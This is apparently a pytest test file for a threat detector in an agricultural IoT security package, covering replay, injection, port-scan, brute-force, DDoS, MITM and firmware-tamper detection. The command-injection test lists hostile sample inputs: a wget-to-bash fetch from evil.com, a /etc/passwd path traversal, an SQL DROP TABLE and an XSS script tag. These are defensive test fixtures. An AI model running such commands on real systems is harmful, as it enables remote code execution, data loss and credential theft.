"""Tests for ThreatDetector."""
import pytest
from agri_security.threat_detector import NetworkEvent, ThreatDetector, ThreatType
from tests.conftest import make_event


class TestReplayAttack:
    def test_duplicate_event_id_flagged(self, threat_detector):
        e = make_event(event_id="EVT-DUP-001")
        threat_detector.analyze(e)
        result = threat_detector.analyze(e)
        assert result.is_threat
        assert result.threat_type == ThreatType.REPLAY_ATTACK

    def test_unique_event_ids_not_flagged(self, threat_detector):
        for i in range(5):
            result = threat_detector.analyze(make_event(event_id=f"EVT-{i:04d}"))
        assert not (result.is_threat and result.threat_type == ThreatType.REPLAY_ATTACK)


class TestCommandInjection:
    @pytest.mark.parametrize("payload,expected", [
        ("$(wget http://evil.com/shell.sh -O- | bash)", True),
        ("normal sensor data: temperature=22.5", False),
        ("../../etc/passwd", True),
        ("SELECT * FROM sensors; DROP TABLE sensors;", True),
        ("<script>alert('xss')</script>", True),
        ("value=42.0&unit=C", False),
    ])
    def test_injection_patterns(self, threat_detector, payload, expected):
        e = make_event(event_id=f"EVT-INJ-{hash(payload) % 10000:04d}", payload_snippet=payload)
        result = threat_detector.analyze(e)
        assert result.is_threat == expected
        if expected:
            assert result.threat_type == ThreatType.COMMAND_INJECTION


class TestPortScan:
    def test_port_scan_detected(self, threat_detector):
        # threat_detector fixture has threshold=5
        for port in range(1, 7):
            result = threat_detector.analyze(
                make_event(event_id=f"EVT-PS-{port:03d}", source_ip="10.0.0.99",
                           destination_port=port)
            )
        assert result.is_threat
        assert result.threat_type == ThreatType.PORT_SCAN

    def test_below_threshold_not_flagged(self, threat_detector):
        for port in range(1, 4):  # only 3 ports, threshold=5
            result = threat_detector.analyze(
                make_event(event_id=f"EVT-BT-{port:03d}", source_ip="10.0.1.99",
                           destination_port=port)
            )
        assert not (result.is_threat and result.threat_type == ThreatType.PORT_SCAN)


class TestBruteForce:
    def test_brute_force_detected(self, threat_detector):
        for i in range(4):  # threshold=3
            result = threat_detector.analyze(
                make_event(event_id=f"EVT-BF-{i:03d}", source_ip="10.0.0.88",
                           auth_success=False)
            )
        assert result.is_threat
        assert result.threat_type == ThreatType.BRUTE_FORCE

    def test_successful_auth_not_counted(self, threat_detector):
        for i in range(5):
            result = threat_detector.analyze(
                make_event(event_id=f"EVT-SA-{i:03d}", source_ip="10.0.0.77",
                           auth_success=True)
            )
        assert not (result.is_threat and result.threat_type == ThreatType.BRUTE_FORCE)


class TestDDoS:
    def test_ddos_detected(self, threat_detector):
        # threshold=10
        for i in range(11):
            result = threat_detector.analyze(
                make_event(event_id=f"EVT-DD-{i:04d}", source_ip="10.0.0.200")
            )
        assert result.is_threat
        assert result.threat_type == ThreatType.DDOS


class TestMITM:
    def test_mitm_detected_on_gateway_change(self, threat_detector):
        e1 = make_event(event_id="EVT-MITM-001", source_ip="192.168.1.1", device_id="D-TARGET")
        e2 = make_event(event_id="EVT-MITM-002", source_ip="10.20.30.40", device_id="D-TARGET")
        threat_detector.analyze(e1)
        result = threat_detector.analyze(e2)
        assert result.is_threat
        assert result.threat_type == ThreatType.MITM

    def test_same_gateway_no_mitm(self, threat_detector):
        for i in range(3):
            result = threat_detector.analyze(
                make_event(event_id=f"EVT-SGW-{i:03d}", source_ip="192.168.1.1",
                           device_id="D-STABLE")
            )
        assert not (result.is_threat and result.threat_type == ThreatType.MITM)


class TestFirmwareVerification:
    def test_firmware_tamper_detected(self, threat_detector):
        threat_detector.register_firmware_checksum("D-FW-01", "a" * 64)
        result = threat_detector.verify_firmware("D-FW-01", b"tampered firmware bytes")
        assert result.is_threat
        assert result.threat_type == ThreatType.FIRMWARE_TAMPER
        assert result.severity == "critical"

    def test_firmware_ok(self, threat_detector):
        import hashlib
        data = b"legitimate firmware v1.2.3"
        checksum = hashlib.sha256(data).hexdigest()
        threat_detector.register_firmware_checksum("D-FW-02", checksum)
        result = threat_detector.verify_firmware("D-FW-02", data)
        assert not result.is_threat

    def test_firmware_no_registered_checksum(self, threat_detector):
        result = threat_detector.verify_firmware("D-UNKNOWN", b"some bytes")
        assert not result.is_threat


class TestBatchAnalysis:
    def test_batch_returns_correct_count(self, threat_detector):
        events = [make_event(event_id=f"EVT-BATCH-{i:04d}") for i in range(5)]
        results = threat_detector.analyze_batch(events)
        assert len(results) == 5
